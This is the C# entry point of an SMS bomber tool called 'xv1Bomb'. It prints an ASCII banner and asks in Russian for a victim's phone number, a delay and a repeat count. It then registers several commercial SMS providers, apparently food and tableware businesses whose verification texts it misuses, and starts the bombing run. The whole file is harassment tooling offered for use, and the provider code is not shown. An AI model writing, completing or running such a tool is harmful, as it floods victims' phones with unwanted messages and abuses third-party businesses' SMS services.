using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using xv1Bomb.providers;

namespace xv1Bomb
{
    class Program
    {
        static async Task Main(string[] args)
        {
            register();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"    __      ____ ____                  _               ");
            Console.WriteLine(@"    \ \    / /_ |  _ \                | |              ");
            Console.WriteLine(@"__  _\ \  / / | | |_) | ___  _ __ ___ | |__   ___ _ __ ");
            Console.WriteLine(@"\ \/ /\ \/ /  | |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|");
            Console.WriteLine(@" >  <  \  /   | | |_) | (_) | | | | | | |_) |  __/ |   ");
            Console.WriteLine(@"/_/\_\  \/    |_|____/ \___/|_| |_| |_|_.__/ \___|_|   ");
            Console.WriteLine();

            var bomber = new Bomber();
            CancellationTokenSource CTS = new CancellationTokenSource();
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Введите номер жертвы в формате (XXX)(XXX)(XX)(XX). Пример - 9641241212 ");
            Console.ForegroundColor = ConsoleColor.White;
            string phoneNumber = Console.ReadLine();
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Введите задержку между смс-ками (0 - почти без задержки): ");
            Console.ForegroundColor = ConsoleColor.White;
            int delay = Int32.Parse(Console.ReadLine());
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("введите кол-во повторений: ");
            Console.ForegroundColor = ConsoleColor.White;
            int repeat = Int32.Parse(Console.ReadLine());
            
            await bomber.StartBombing(phoneNumber, CTS.Token, repeat, delay);
            //if(Console.ReadLine()=="") CTS.Cancel();
            
        }

        static void register()
        {
            smsProviderRegistry.Register(new sushiStudioProvider());
            smsProviderRegistry.Register(new posudaProvider());
            smsProviderRegistry.Register(new kitchenProvider());
            smsProviderRegistry.Register(new deliveryProvider());
        }
    }
}